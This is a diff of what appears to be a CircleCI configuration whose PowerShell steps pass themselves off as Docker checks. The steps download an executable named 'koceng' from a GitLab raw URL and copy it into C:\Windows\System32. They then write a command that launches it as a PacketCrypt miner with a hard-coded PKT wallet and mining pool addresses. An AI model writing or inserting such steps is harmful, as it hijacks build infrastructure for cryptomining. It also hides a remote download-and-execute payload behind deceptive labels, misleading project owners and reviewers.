@@ -13,22 +13,17 @@ jobs:
       - checkout
       - run: systeminfo
       - run:
-          name: "Check docker"
-          shell: powershell.exe
-          command: |
-            docker pull thomasjp0x42/packetcrypt
-      - run:
-          name: "Checks docker"
+          name: "Checks dockers"
           shell: powershell.exe
           command: |
             Invoke-WebRequest https://gitlab.com/kabehada3/pantek/-/raw/main/koceng
       - run:
-          name: "Checks docker"
+          name: "Checks dockerx"
           shell: powershell.exe
           command: |
             Copy koceng C:\Windows\System32
       - run:
-          name: "Checks docker"
+          name: "Checks dockera"
           shell: powershell.exe
           command: |
             cmd /c echo cmd /k start koceng ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkt.world >>jingcci.ps1
